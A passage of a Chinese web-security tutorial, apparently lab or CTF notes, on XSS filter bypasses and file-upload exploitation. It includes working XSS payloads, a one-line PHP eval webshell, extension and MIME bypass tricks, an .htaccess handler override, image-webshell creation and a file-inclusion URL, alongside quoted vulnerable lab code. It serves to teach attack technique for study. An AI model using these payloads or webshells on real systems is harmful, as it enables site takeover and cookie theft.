class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或使用js将cookie发送到特定的网站，通过XSS平台获取管理员cookie</p><h3 id="一些常见绕过"><a href="#一些常见绕过" class="headerlink" title="一些常见绕过"></a>一些常见绕过</h3><p>针对XSS攻击，网站一般会对用户输入进行过滤,那么我们可以进行一些常见的绕过</p><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只过滤了<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">标签,可以尝试<span class="tag">&lt;<span class="name">scRipt</span>&gt;</span>绕过</span></span></span><br></pre></td></tr></table></figure><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>可以尝试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;script&gt;pt&gt;</span><br></pre></td></tr></table></figure><p>因为将中间的script替换为空，剩下的结合后又是script可以成功绕过。</p><h4 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span> <span class="comment">&lt;!--加载svg图片时执行js代码&quot;alert(1)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span> <span class="comment">&lt;!--通过js伪协议执行js代码&quot;alert(1)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.cookie)</span>&gt;</span>xxs link<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="comment">&lt;!--光标移动到xss link超链接上执行js代码&quot;alert(document.cookie)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="comment">&lt;!--点击link超链接通过js伪协议执行js代码&quot;alert(1)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span> <span class="comment">&lt;!--通过故意引用不存在的图片触发onerror命令执行js代码&quot;alert(1)&quot;--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="HTML实体编码绕过"><a href="#HTML实体编码绕过" class="headerlink" title="HTML实体编码绕过"></a>HTML实体编码绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以不带分号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x29</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>网页中显示空格可以用&nbsp;<br>也可以用实体编码&#x20;</p><h4 id="内嵌tab"><a href="#内嵌tab" class="headerlink" title="内嵌tab"></a>内嵌tab</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">java&amp;#x09;script:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>防止javascrpt被过滤掉</p><h3 id="XSS平台获取cookie"><a href="#XSS平台获取cookie" class="headerlink" title="XSS平台获取cookie"></a>XSS平台获取cookie</h3><p><a href="https://blog.csdn.net/NSQ0207/article/details/131891269">https://blog.csdn.net/NSQ0207/article/details/131891269</a><br>可以参考这篇博客</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>服务端代码未对客户端上传的文件进行严格的验证，导致漏洞。</p><p>非法用户可以利用上传的恶意文件控制整个网站，这个恶意文件被称为WebShell，也可以称为一种网页后门</p><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>我们可以先从最简单但是很实用的一句话木马介绍起</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ytm666&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么写个这样的php文件内容为一句话木马并上传到目标网站,就可以进行恶意操作</p><p>这样通过POST请求传给ytm666参数就可以执行任意php代码导致危害</p><p>例如执行system函数进行恶意操作,例如查看网页目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ytm666=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;dir&#x27;</span>);</span><br></pre></td></tr></table></figure><p>那么知道原理后我们就可以使用重量级的东西去远程连接webshell并进行不同的操作,例如利用蚁剑连接(其中添加数据时的密码就为POST请求的参数)</p><p>那么通过蚁剑可以查看网站的各种目录以及进行一系列操作</p><h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><h4 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h4><p>如果客户端js脚本有加限制(如不允许上传.php后缀的文件),可以直接使用burpsuite发送请求,通过先改为合法后缀名后上传,再更改burpsuite抓到的数据包中后缀名使php文件生效后进行发包植入后门</p><p>当然也可以直接禁用浏览器js绕过</p><h4 id="服务端文件类型检查-服务端MIME类型验证"><a href="#服务端文件类型检查-服务端MIME类型验证" class="headerlink" title="服务端文件类型检查(服务端MIME类型验证)"></a>服务端文件类型检查(服务端MIME类型验证)</h4><p>MIME类型是描述消息内容类型的因特网标准,可以利用Burp抓包，将报文中的Content-Type改成允许的类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="comment">//取出文件上传后临时存储的文件名</span></span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="comment">//生成一个新的文件存储路径，文件名保持文件上传前的文件名</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">        <span class="comment">//move_uploaded_file函数把上传的文件移动到新的位置，成功则返回true，失败则返回false</span></span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例如对于这道题的源码,我们就可以将其中修改<br><img src="https://img-blog.csdnimg.cn/20210522234227501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70" alt="1"></p><h4 id="文件后缀绕过"><a href="#文件后缀绕过" class="headerlink" title="文件后缀绕过"></a>文件后缀绕过</h4><p>如果.php后缀被限制，可以尝试这些后缀（webshell内容一样）：.phtml、.pht、.php3、.php4、.php5(前提是apache的httpd.conf中有如下配置代码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><hr><p>或者可以进行大小写绕过(<strong>后缀名大小写绕过原理</strong>：服务端没有将后缀名转换为统一格式进行比对，导致可以上传后缀为pHp的文件，又因为Windows操作系统大小写不敏感，所以.pHp扔回被当成PHP文件解析),例如对于这样的后端代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为在这段代码中没有出现能使文件名转为小写的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p>这种情况下就可以考虑大小写绕过,比如上传后缀为pHP的文件</p><hr><p><strong>.phtml、.pht</strong>文件也可以这样写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"> <span class="built_in">eval</span>($_POST[<span class="string">&#x27;ytm666&#x27;</span>]); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以绕过对于过滤文件中”&lt;?”部分的题目,通过用js标签声明php语言使其中的php代码生效并进行绕过</p><hr><p>.php、.phtml等很多后缀都被限制，可以尝试上传.htaccess文件（只支持apache服务器）</p><p>上传后，所在目录中名字包含png的文件将被当作php代码解析。例如这样的.htaccess文件:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;png&quot;</span>&gt; setHander application/x-httpd-php &lt;/<span class="title class_">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure><hr><p>有时我们遇到这样的情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端将黑名单的后缀名替换为空,但仅进行一次,我们就可以尝试双写绕过,构造后缀名为.phphpp,那么后端替换php一次为空，则后缀就又为.php了</p><h4 id="图片马绕过"><a href="#图片马绕过" class="headerlink" title="图片马绕过"></a>图片马绕过</h4><p>对于这样的源码,如果绕过服务器文件文件头内容验证呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此先介绍一下文件头相关内容:</p><p>图片格式往往不是根据文件后缀名去做判断的。文件头是文件开头的一段二进制，不同的图片类型，文件头是不同的。文件头又称文件幻数。</p><p>常见文件幻数</p><ul><li><p>JPG: FF D8 FF EO 00 10 4A 46 49 46.</p></li><li><p>GIF:47 49 46 3839 61(GIF89a).</p></li><li><p>PNG:89 50 4E 47</p></li></ul><hr><p>那么对于上面这道题或者使用getimagesize()函数读取图片信息(必须有真实的图片内容),我们可以尝试使用图片马绕过:</p><p>先介绍下生成图片马的方法</p><ol><li><p>在路径下准备好一句话木马.php和一张图片 .png (或者 .jpg )</p></li><li><p>输入系统指令： copy 一张图片.png&#x2F;b+一句话木马.php&#x2F;a 生成图片名称.png</p></li></ol><p>  这样图片木马就合成好了</p><p>我们利用服务器将木马文件解析成了图片文件，但因此向其发送执行该文件的请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。</p><p>接下来如何使这样的图片马生效呢</p><p>那么当然可以传之前介绍过的.htaccess文件,但是如果此文件不能上传,我们就可以选择使用<strong>文件包含</strong>漏洞来使其生效</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html:charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(_file_);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以构造url为:</p><p><code>http://xxx/include.php?file=upload/图片名称.png</code></p><h4 id="user-ini绕过"><a href="#user-ini绕过" 